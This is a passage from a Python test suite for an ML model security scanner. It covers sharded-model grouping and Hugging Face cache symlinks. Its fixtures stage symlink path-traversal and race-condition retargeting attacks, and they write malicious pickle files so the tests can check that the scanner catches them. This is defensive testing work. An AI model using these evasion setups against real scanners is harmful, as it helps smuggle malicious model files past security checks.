        shard_path.write_bytes(payload)
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        result = _mock_sharded_scan_result(family_size)
        result.metadata["file_size"] = family_size
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    expected_sizes = {str(shard): shard.stat().st_size for shard in shards}
    assert {path: metadata.file_size for path, metadata in result.file_metadata.items()} == expected_sizes
    assert {asset.path: asset.size for asset in result.assets} == expected_sizes


def test_directory_scan_rejects_shard_siblings_outside_scan_root(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    first_shard = model_dir / "model-00001-of-00002.safetensors"
    first_shard.write_bytes(b"inside-shard")
    outside_shard = outside_dir / "model-00002-of-00002.safetensors"
    outside_shard.write_bytes(b"outside-shard")
    (model_dir / outside_shard.name).symlink_to(outside_shard)
    calls: list[str] = []
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(first_shard.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
    outside_path = str(outside_shard.resolve())

    assert len(calls) == 1
    assert outside_path not in result.file_metadata
    assert outside_path not in {asset.path for asset in result.assets}
    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert outside_path not in {member["path"] for member in fingerprint["members"]}
    assert any(
        issue.message == "Path traversal outside scanned directory"
        and issue.location == outside_path
        and issue.details["resolved_path"] == outside_path
        for issue in result.issues
    )
    assert sum(issue.message == "Path traversal outside scanned directory" for issue in result.issues) == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_groups_hf_cache_sharded_symlinks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshots_dir = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshots_dir.mkdir(parents=True)
    blobs_dir.mkdir()

    blob_paths: list[Path] = []
    shard_links: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        shard_link = snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_link.symlink_to(Path("../../blobs") / blob_path.name)
        blob_paths.append(blob_path.resolve())
        shard_links.append(shard_link)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshots_dir), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard_link.name for shard_link in shard_links}
    assert result.files_scanned == len(shard_links)
    assert set(result.file_metadata) == {str(shard_link) for shard_link in shard_links}
    assert {asset.path for asset in result.assets} == {str(shard_link) for shard_link in shard_links}
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}
    assert not any("path traversal" in issue.message.lower() for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_does_not_reresolve_trusted_hf_alias(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A canonical HF target must not depend on a second raw readlink call."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob"
    blob_path.write_bytes(b"hf-model")
    alias = snapshot / "model.safetensors"
    alias.symlink_to(Path("../../blobs") / blob_path.name)

    original_resolve = Path.resolve
    alias_resolve_calls = 0

    def fail_redundant_resolve(path: Path, strict: bool = False) -> Path:
        nonlocal alias_resolve_calls
        if path == alias:
            alias_resolve_calls += 1
            if alias_resolve_calls > 1:
                raise OSError("trusted alias cannot be resolved again")
        return original_resolve(path, strict=strict)

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        return _mock_sharded_scan_result(blob_path.stat().st_size)

    monkeypatch.setattr(Path, "resolve", fail_redundant_resolve)
    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    assert result.files_scanned == 1
    assert alias_resolve_calls == 1
    assert result.has_errors is False
    assert not any(issue.message == "Directory entry unavailable during discovery" for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_continues_when_hf_shard_alias_retargets_after_resolution(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A changing HF alias must not abort discovery before later malicious files."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob"
    blob_path.write_bytes(b"hf-shard")
    alias = snapshot / "model-00001-of-00001.safetensors"
    alias.symlink_to(Path("../../blobs") / blob_path.name)
    malicious_payload = snapshot / "z-malicious.pkl"
    malicious_payload.write_bytes(_build_malicious_pickle())
    original_resolve_target = core_module._resolve_directory_scan_target
    retargeted = False

    def retarget_after_resolution(
        file_path: Path,
        base_dir: Path,
        *,
        is_hf_cache: bool,
        hf_cache_root: Path | None,
        results: ModelAuditResultModel,
        reported_traversal_targets: set[str] | None = None,
    ) -> tuple[Path | None, bool, bool]:
        nonlocal retargeted
        resolved = original_resolve_target(
            file_path,
            base_dir,
            is_hf_cache=is_hf_cache,
            hf_cache_root=hf_cache_root,
            results=results,
            reported_traversal_targets=reported_traversal_targets,
        )
        if file_path == alias and resolved[0] is not None:
            alias.unlink()
            alias.symlink_to(alias.name)
            retargeted = True
        return resolved

    monkeypatch.setattr(core_module, "_resolve_directory_scan_target", retarget_after_resolution)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    assert retargeted is True
    assert any(issue.rule_code == "S201" for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_does_not_require_strict_hf_alias_resolution(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Valid relative aliases remain scannable when strict alias resolution is unavailable."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob"
    blob_path.write_bytes(b"hf-model")
    alias = snapshot / "model.safetensors"
    alias.symlink_to(Path("../../blobs") / blob_path.name)

    original_resolve = Path.resolve

    def reject_strict_symlink_resolution(path: Path, strict: bool = False) -> Path:
        if strict and path.is_symlink():
            raise OSError("strict relative symlink resolution is unavailable")
        return original_resolve(path, strict=strict)

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        return _mock_sharded_scan_result(blob_path.stat().st_size)

    monkeypatch.setattr(Path, "resolve", reject_strict_symlink_resolution)
    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    assert result.files_scanned == 1
    assert result.has_errors is False
    assert not any("path traversal" in issue.message.lower() for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_rejects_symlinked_hf_blobs_root(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A cache-shaped blobs symlink must not grant traversal outside the model cache."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    outside_dir = tmp_path / "outside"
    snapshot.mkdir(parents=True)
    outside_dir.mkdir()
    outside_payload = outside_dir / "blob"
    outside_payload.write_bytes(_build_malicious_pickle())
    (cache_dir / "blobs").symlink_to(outside_dir, target_is_directory=True)
    shard_alias = snapshot / "model-00001-of-00001.safetensors"
    shard_alias.symlink_to(Path("../../blobs") / outside_payload.name)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    assert result.files_scanned == 0
    assert any(
        issue.message == "Path traversal outside scanned directory"
        and issue.location == str(shard_alias)
        and issue.details["resolved_path"] == str(outside_payload)
        for issue in result.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_fails_closed_when_hf_alias_retargets_after_discovery(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Hashing and dispatch must retain the target identity captured during discovery."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_one = blobs_dir / "blob-1"
    blob_two = blobs_dir / "blob-2"
    blob_one.write_bytes(b"one")
    blob_two.write_bytes(b"two")
    shard_one = snapshot / "model-00001-of-00002.safetensors"
    shard_two = snapshot / "model-00002-of-00002.safetensors"
    shard_one.symlink_to(Path("../../blobs") / blob_one.name)
    shard_two.symlink_to(Path("../../blobs") / blob_two.name)
    original_hash_files = core_module._hash_files_by_path

    def retarget_after_hash(
        file_paths: list[str],
        *,
        config: dict[str, Any] | None = None,
        routing_paths: dict[str, str] | None = None,
        hashed_identities: dict[str, dict[str, int]] | None = None,
    ) -> dict[str, str]:
        assert set(file_paths) == {str(blob_one), str(blob_two)}
        assert routing_paths == {str(blob_one): str(shard_one), str(blob_two): str(shard_two)}
        hashes = original_hash_files(
            file_paths,
            config=config,
            routing_paths=routing_paths,
            hashed_identities=hashed_identities,
        )
        shard_one.unlink()
        shard_one.symlink_to(Path("../../blobs") / blob_two.name)
        return hashes

    monkeypatch.setattr(core_module, "_hash_files_by_path", retarget_after_hash)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    assert result.success is False
    assert result.has_errors is True
    assert any(check.name == "Sharded Model Boundary Check" for check in result.checks)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_allows_mixed_regular_and_hf_blob_shards(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Family allowlisting must not depend on the first shard being an HF symlink."""
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshots_dir = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshots_dir.mkdir(parents=True)
    blobs_dir.mkdir()
    regular_shard = snapshots_dir / "model-00001-of-00002.safetensors"
    linked_shard = snapshots_dir / "model-00002-of-00002.safetensors"
    blob_path = blobs_dir / "blob-2"
    regular_shard.write_bytes(b"regular-shard")
    blob_path.write_bytes(b"linked-shard")
    linked_shard.symlink_to(Path("../../blobs") / blob_path.name)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(regular_shard.stat().st_size + blob_path.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshots_dir), cache_scan_results=False)

    assert calls == [str(regular_shard.resolve())]
    assert result.files_scanned == 2
    assert not any(issue.message == "Path traversal outside scanned directory" for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_nonsharded_hf_snapshot_aliases_deduplicated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_path = blobs_dir / "shared-blob"
    blob_path.write_bytes(b"shared-model")

    for revision in ("abc123", "def456"):
        snapshots_dir = cache_dir / "snapshots" / revision
        snapshots_dir.mkdir(parents=True)
        (snapshots_dir / "model.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(blob_path.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert calls == [str(blob_path.resolve())]
    assert result.files_scanned == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_identical_hf_shard_families_across_snapshots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision in ("abc123", "def456"):
            snapshots_dir = cache_dir / "snapshots" / revision
            snapshots_dir.mkdir(parents=True, exist_ok=True)
            (snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
                Path("../../blobs") / blob_path.name
            )

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert result.files_scanned == len(blob_paths)
    assert result.bytes_scanned == sum(blob_path.stat().st_size for blob_path in blob_paths)
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_reports_incomplete_hf_snapshot_after_shared_blob_dedupe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        full_snapshot = cache_dir / "snapshots" / "abc123"
        full_snapshot.mkdir(parents=True, exist_ok=True)
        (full_snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
            Path("../../blobs") / blob_path.name
        )

    partial_snapshot = cache_dir / "snapshots" / "def456"
    partial_snapshot.mkdir(parents=True)
    (partial_snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_paths[0].name)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        material_config = normalize_material_scan_config(captured_configs[-1])
        fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
        member_paths = [Path(member["path"]) for member in fingerprint["members"]]
        return _mock_sharded_scan_result(
            sum(member_path.stat().st_size for member_path in member_paths),
            missing_shards=1 if len(member_paths) == 1 else 0,
        )

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_configs = [normalize_material_scan_config(config) for config in captured_configs]
    fingerprints = [config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY] for config in material_configs]
    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 2
    assert sorted(len(fingerprint["members"]) for fingerprint in fingerprints) == [1, 2]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_distinct_hf_shard_filename_patterns(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision, filename in (
            ("abc123", f"model-{shard_index:05d}-of-00002.safetensors"),
            ("def456", f"pytorch_model-{shard_index:05d}-of-00002.bin"),
        ):
            snapshot = cache_dir / "snapshots" / revision
            snapshot.mkdir(parents=True, exist_ok=True)
            (snapshot / filename).symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert len(calls) == 2
    assert {Path(call).suffix for call in calls} == {".bin", ".safetensors"}
    assert result.files_scanned == 4


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_hf_shard_aliases_against_raw_blobs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}.safetensors"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        (snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).parent == snapshot
    assert result.files_scanned == 2


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_handles_broken_hf_shard_alias_per_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob-1"
    blob_path.write_bytes(b"hf-shard-1")
    (snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)
    missing_blob = blobs_dir / "missing-blob"
    (snapshot / "model-00002-of-00002.safetensors").symlink_to(Path("../../blobs") / missing_blob.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(blob_path.stat().st_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert calls == [str(snapshot / "model-00001-of-00002.safetensors")]
    assert len(coverage_checks) == 1
    assert result.has_errors is True
    assert any(
        issue.message == "Broken symlink encountered"
        and issue.location == str(snapshot / "model-00002-of-00002.safetensors")
        and issue.details["scan_outcome_reason"] == "directory_entry_unavailable"
        for issue in result.issues
    )


def test_scan_file_passes_shard_allowlist_to_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_selection_allowed_paths: list[list[str] | None] = []
    captured_allowed_paths: list[list[str] | None] = []
    captured_allowed_targets: list[core_module.ValidatedShardTargets | None] = []

    class DummyScanner:
        name = "dummy"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

    def fake_select_preferred_scanner_id(
        path: str,
        header_format: str,
        ext: str,
        config: dict[str, Any] | None = None,
    ) -> str | None:
        del config
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return None

    def fake_get_scanner_for_path(path: str, **kwargs: Any) -> type[DummyScanner]:
        assert path == str(shard)
        assert kwargs == {"scanner_selection": None}
        return DummyScanner

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        captured_allowed_targets.append(allowed_shard_targets)
        assert core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY not in scanner.config
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    def fake_should_use_advanced_handler(
        path: str,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
    ) -> bool:
        captured_selection_allowed_paths.append(allowed_shard_paths)
        captured_allowed_targets.append(allowed_shard_targets)
        return path == str(shard)

    monkeypatch.setattr(core_module, "should_use_advanced_handler", fake_should_use_advanced_handler)
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", fake_get_scanner_for_path)
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {
                        "source_path": str(shard),
                        "path": allowed_path,
                        "device": shard.stat().st_dev,
                        "inode": shard.stat().st_ino,
                        "content_hash": "sha256:inside",
                    },
                    {"path": 123, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy"
    assert captured_selection_allowed_paths == [[allowed_path]]
    assert captured_allowed_paths == [[allowed_path]]
    assert all(
        targets is not None and targets[str(shard)]["resolved_path"] == allowed_path
        for targets in captured_allowed_targets
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_scan_file_fails_closed_when_grouped_shard_retargets_outside_allowlist(tmp_path: Path) -> None:
    """A stale grouped representative cannot downgrade into an ordinary scan."""
    scan_dir = tmp_path / "scan"
    outside_dir = tmp_path / "outside"
    scan_dir.mkdir()
    outside_dir.mkdir()
    shard = scan_dir / "model-00001-of-00001.safetensors"
    inside_target = scan_dir / "inside.safetensors"
    outside_target = outside_dir / "outside.safetensors"
    inside_target.write_bytes(b"inside")
    outside_target.write_bytes(b"outside")
    shard.symlink_to(inside_target)
    allowed_path = str(inside_target.resolve())
    shard.unlink()
    shard.symlink_to(outside_target)

    result = core_module._scan_file_internal(
        str(shard),
        config={
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [{"path": allowed_path, "content_hash": "sha256:inside"}],
            },
        },
    )

    assert result.success is False
    assert result.scanner_name == "shard_boundary"
    assert result.metadata["operational_error_reason"] == "shard_boundary_changed"
    assert result.metadata["scan_outcome_reasons"] == ["shard_boundary_changed"]
    assert any(check.name == "Sharded Model Boundary Check" for check in result.checks)


def test_scan_file_fails_closed_when_grouped_shard_content_changes(tmp_path: Path) -> None:
    """Hash-time shard identity must still match when grouped scanning begins."""
    shard = tmp_path / "model-00001-of-00001.safetensors"
    shard.write_bytes(b"malicious")
    hash_time_stat = shard.stat()
    shard.write_bytes(b"benign!!!")
    os.utime(
        shard,
        ns=(hash_time_stat.st_atime_ns, hash_time_stat.st_mtime_ns + 1_000_000_000),
    )

    result = core_module._scan_file_internal(
        str(shard),
        config={
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {
                        "source_path": str(shard),
                        "path": str(shard.resolve()),
                        "device": hash_time_stat.st_dev,
                        "inode": hash_time_stat.st_ino,
                        "size": hash_time_stat.st_size,
                        "mtime_ns": hash_time_stat.st_mtime_ns,
                        "ctime_ns": hash_time_stat.st_ctime_ns,
                        "content_hash": "stale-hash",
                    }
                ],
            },
        },
    )

    assert result.success is False
    assert result.scanner_name == "shard_boundary"
    assert result.metadata["operational_error_reason"] == "shard_boundary_changed"
    boundary_check = next(check for check in result.checks if check.name == "Sharded Model Boundary Check")
    assert boundary_check.details["reason"] == "shard_target_content_changed"


def test_scan_file_ignores_outer_shard_boundary_for_non_shard_payload(tmp_path: Path) -> None:
    """A nested non-shard member should retain malicious scanning under an outer fingerprint."""
    shard = tmp_path / "model-00001-of-00001.pt"
    shard.write_bytes(b"outer shard")
    nested_payload = tmp_path / "payload.pkl"
    nested_payload.write_bytes(_build_malicious_pickle())

    result = scan_file(
        str(nested_payload),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [{"path": str(shard.resolve()), "content_hash": "sha256:outer"}],
            },
        },
    )

    assert result.scanner_name == "pickle"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_resolve_discovered_shard_path_handles_concurrent_symlink_loop(tmp_path: Path) -> None:
    """Concurrent shard breakage becomes an incomplete-discovery issue instead of an exception."""
    shard_path = tmp_path / "model-00002-of-00002.safetensors"
    shard_path.symlink_to(shard_path.name)
    results = core_module.create_initial_audit_result()

    resolved = core_module._resolve_discovered_shard_path(str(shard_path), results)

    assert resolved is None
    assert any(
        issue.message == "Shard path changed during directory discovery"
        and issue.location == str(shard_path)
        and issue.details["scan_outcome_reason"] == "shard_path_changed"
        for issue in results.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_resolve_directory_scan_target_allows_restored_symlink_target(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A target restored during preflight should continue through normal validation."""
    target_path = tmp_path / "target.bin"
    target_path.write_bytes(b"safe")
    link_path = tmp_path / "model.bin"
    link_path.symlink_to(target_path.name)
    base_dir = tmp_path.resolve()
    results = core_module.create_initial_audit_result()
    original_exists = Path.exists
    link_exists_calls = 0

    def transient_exists(path: Path) -> bool:
        nonlocal link_exists_calls
        if path == link_path:
            link_exists_calls += 1
            return link_exists_calls > 1
        return original_exists(path)

    monkeypatch.setattr(Path, "exists", transient_exists)

    resolved, is_hf_cache_symlink, entry_unavailable = core_module._resolve_directory_scan_target(
        link_path,
        base_dir,
        is_hf_cache=False,
        hf_cache_root=None,
        results=results,
    )

    assert resolved == target_path.resolve()
    assert is_hf_cache_symlink is False
    assert entry_unavailable is False
    assert results.issues == []


@pytest.mark.usefixtures("requires_symlinks")
def test_resolve_directory_scan_target_reports_missing_symlink_when_windows_stat_succeeds(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Windows may stat a dangling reparse point without reaching its missing target."""
    broken_path = tmp_path / "missing.bin"
    broken_path.symlink_to("absent.bin")
    base_dir = tmp_path.resolve()
    results = core_module.create_initial_audit_result()
    original_exists = Path.exists
    original_resolve = Path.resolve
    original_stat = Path.stat
    original_readlink = os.readlink

    def fake_exists(path: Path) -> bool:
        return False if path == broken_path else original_exists(path)

